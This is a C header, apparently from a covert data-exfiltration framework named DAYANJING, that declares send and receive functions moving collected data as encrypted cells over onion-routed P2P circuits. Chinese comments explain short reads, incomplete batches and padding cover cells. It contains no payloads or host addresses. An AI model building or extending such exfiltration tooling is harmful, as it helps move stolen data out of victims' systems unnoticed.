/*
 * DAYANJING v4 — exfil_link.h
 *
 * 回传层与已建立电路的 IO 绑定：把「一条采集产物」写进 fd、从 fd 读出。
 *
 * ====================================================================
 * 为什么单独一层
 * ====================================================================
 * 21_exfil 的 chan 层只做「记录 <-> 信元流」的转换，它是纯内存的，
 * 不知道 fd 是什么。真实部署时信元要走 14_p2p 的电路（洋葱 + 多跳），
 * 那一端是一个 socket。若把 IO 写在测试里，每个调用方都要重写一遍
 * 「读满 512 字节」「EOF 判定」「短写处理」——这三处正是最容易错的。
 *
 * 因此固化为 exfil_link：
 *   exfil_link_send —— 编码信元流并**全部**写出（处理短写）
 *   exfil_link_recv —— 循环读满 512 字节喂入，直到一批完成（DONE）
 *
 * ====================================================================
 * 两条硬规则（本层最容易踩的坑）
 * ====================================================================
 * 1. TCP 是字节流，recv 不保证一次返回 512 字节。必须循环读满，
 *    否则喂进 chan 的是半个信元，AEAD 必然验签失败，
 *    表现为 AUTH——很容易被误判成「密钥错了」而实际是 IO 读短了。
 *
 * 2. 连接断开（recv 返回 0）时若仍处在一批中间，必须报
 *    EXF_ERR_INCOMPLETE，绝不能把已累积的部分当成功返回。
 *    「对端崩溃 / 链路被掐断」与「对端正常发完」必须可区分，
 *    否则采集产物会以「成功」之名静默丢失。
 *
 * 覆盖信元（PAD）由 chan 层自行忽略（返回 EXF_OK），本层继续读下一个，
 * 不计入 in_batch 判定之外的任何状态。
 */

#ifndef DAYANJING_EXFIL_LINK_H
#define DAYANJING_EXFIL_LINK_H

#include <stddef.h>
#include <stdint.h>
#include "exfil.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 单条产物允许的最大信元数（约 16 MiB 载荷；防恶意对端撑爆内存） */
#define EXF_LINK_MAX_CELLS  (1u << 15)

/*
 * 把一条记录编码成信元流并全部写入 fd。
 *   out_cells 可为 NULL。
 * 返回 EXF_OK 表示全部字节已写出；负值见 exfil_errstr。
 */
int exfil_link_send(exfil_chan_t *ch, const exfil_rec_t *r, int fd,
                    size_t *out_cells);

/*
 * 从 fd 读出一条完整记录。
 *
 * 循环读满 P2P_CELL_WIRE 字节后喂入 chan，直到：
 *   EXF_DONE        —— 一批完整，*r 与 payload 已产出（成功返回）
 *   EXF_ERR_INCOMPLETE —— 连接断开但批未完成（对端崩溃 / 链路被掐）
 *   其它负值        —— AUTH / CRC / FMT / LEN 等
 *
 * payload 可为 NULL（探测模式：只解析头，*plen 回填实际载荷长度）。
 * 注意：即使 payload 为 NULL，信元仍会被消耗（计数器推进），
 * 因此探测与真实接收不能交错进行。
 */
int exfil_link_recv(exfil_chan_t *ch, int fd, exfil_rec_t *r,
                    uint8_t *payload, size_t cap, size_t *plen);

/* 写出全部字节（处理短写）。0 成功，-1 失败。SIGPIPE 由调用方忽略。 */
int exfil_link_write_all(int fd, const uint8_t *buf, size_t n);

/* 读满 n 字节。返回实际读到的字节数（< n 表示对端关闭或出错）。 */
size_t exfil_link_read_exact(int fd, uint8_t *buf, size_t n);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_LINK_H */
